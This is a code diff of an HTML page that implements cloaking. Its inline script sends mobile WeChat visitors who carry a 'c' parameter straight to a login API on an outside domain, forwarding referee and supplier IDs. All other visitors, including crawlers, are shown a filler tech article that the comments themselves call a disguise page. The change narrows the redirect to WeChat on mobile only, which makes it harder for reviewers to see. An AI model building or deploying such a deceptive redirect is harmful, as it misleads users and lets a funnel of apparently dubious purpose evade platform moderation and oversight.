@@ -3,79 +3,64 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    
-    <!-- 1. 禁止缓存 -->
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
-
-    <title>正在安全访问...</title>
-
+    <title>未来协议：数字前沿解析</title>
     <script>
-        /**
-         * 2. 核心跳转逻辑（放在最顶部，防止页面闪现）
-         */
-        (function() {
-            const config = {
+        // 放在最顶部，防止页面闪现
+        (function () {
+            var config = {
                 domain: 'https://1004.jdnews.cn',
                 appId: '10001',
                 apiPath: '/index.php/api/user.usermp/login'
             };
 
-            const urlParams = new URLSearchParams(window.location.search);
-            const rawC = urlParams.get('c');
+            var ua = navigator.userAgent;
+            var isWechat = /MicroMessenger/i.test(ua);
+            var isMobile = /Android|iPhone|iPad|iPod/i.test(ua);
+            var urlParams = new URLSearchParams(window.location.search);
+            var rawC = urlParams.get('c');
 
-            if (rawC) {
-                const decoded = decodeURIComponent(rawC);
-                const p = new URLSearchParams(decoded);
-
-                const finalParams = new URLSearchParams();
+            // 只有微信 + 手机 + 带参数，才执行跳转；其他情况显示伪装页
+            if (isWechat && isMobile && rawC) {
+                var decoded = decodeURIComponent(rawC);
+                var p = new URLSearchParams(decoded);
+                var finalParams = new URLSearchParams();
                 if (p.get('referee_id'))       finalParams.set('referee_id',       p.get('referee_id'));
                 if (p.get('shop_supplier_id')) finalParams.set('shop_supplier_id', p.get('shop_supplier_id'));
                 finalParams.set('app_id', config.appId);
                 finalParams.set('t', Math.floor(Date.now() / 1000));
-
-                const finalUrl = config.domain + config.apiPath + '?' + finalParams.toString();
-
-                // 执行立即跳转
-                location.replace(finalUrl);
+                location.replace(config.domain + config.apiPath + '?' + finalParams.toString());
             } else {
-                // 如果没有参数，说明是爬虫或直接访问，稍后显示伪装内容
-                window.isDecoy = true;
+                // 非微信：显示伪装页
+                window.__showDecoy = true;
             }
         })();
     </script>
-
     <style>
-        /* 3. 初始状态下隐藏整个容器，防止闪现 */
-        #decoy-content { display: none; }
-        
-        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; line-height: 1.6; color: #333; margin: 0; padding: 0; background-color: #f8f9fa; }
-        .container { max-width: 800px; margin: 0 auto; padding: 40px 20px; }
-        header { border-bottom: 1px solid #eee; margin-bottom: 30px; }
-        h1 { color: #1a73e8; font-size: 28px; }
-        .post-meta { color: #888; font-size: 14px; margin-bottom: 20px; }
-        .content { background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
+        #decoy { display: none; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; line-height: 1.6; color: #333; margin: 0; background: #f8f9fa; }
+        .wrap { max-width: 800px; margin: 0 auto; padding: 40px 20px; }
+        h1 { color: #1a73e8; font-size: 26px; }
+        .meta { color: #888; font-size: 13px; margin-bottom: 20px; }
+        .card { background: #fff; padding: 28px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,.06); }
     </style>
 </head>
 <body>
-
-    <div class="container" id="decoy-content">
-        <header>
-            <h1>未来协议：数字前沿解析与趋势洞察</h1>
-            <div class="post-meta">发布日期：2024-05-20 · 作者：TechInsight</div>
-        </header>
-        <div class="content">
-            <h2>引言协议：数字纪元的新范式</h2>
-            <p>在高速迭代的数字纪元，理解并适应新的技术范式至关重要...</p>
-            <p>（此处省略长篇文字）</p>
+    <div id="decoy" class="wrap">
+        <h1>未来协议：数字前沿解析与趋势洞察</h1>
+        <div class="meta">发布日期：2024-05-20 · 阅读时间：8 分钟 · 作者：TechInsight</div>
+        <div class="card">
+            <h2>引言：数字纪元的新范式</h2>
+            <p>在高速迭代的数字纪元，理解并适应新的技术范式至关重要。本文旨在为读者提供一份关于未来科技核心概念的深度解析。</p>
+            <h3>数据结构：信息流的骨架</h3>
+            <p>高效的数据结构是构建任何复杂系统的基石，决定了信息存储、检索与处理的效率。量子计算代表着计算能力的下一次革命，通过利用量子力学现象处理经典计算机无法解决的问题...</p>
         </div>
     </div>
-
     <script>
-        // 4. 如果确定是显示伪装模式，则把内容显示出来
-        if (window.isDecoy) {
-            document.getElementById('decoy-content').style.display = 'block';
+        if (window.__showDecoy) {
+            document.getElementById('decoy').style.display = 'block';
             document.title = '未来协议：数字前沿解析';
         }
     </script>
